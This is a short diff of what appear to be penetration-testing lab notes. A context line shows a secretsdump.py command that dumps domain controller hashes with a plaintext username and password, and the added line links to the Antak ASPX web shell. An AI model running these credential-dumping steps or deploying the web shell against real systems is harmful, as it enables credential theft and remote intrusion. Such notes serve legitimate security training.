@@ -148,6 +148,7 @@ hashdump from Linux:
 secretsdump.py -just-dc CT059:charlie1@172.16.7.3 -outputfile LASTHASH
 
 
+https://github.com/samratashok/nishang/blob/master/Antak-WebShell/antak.aspx
 
 
 
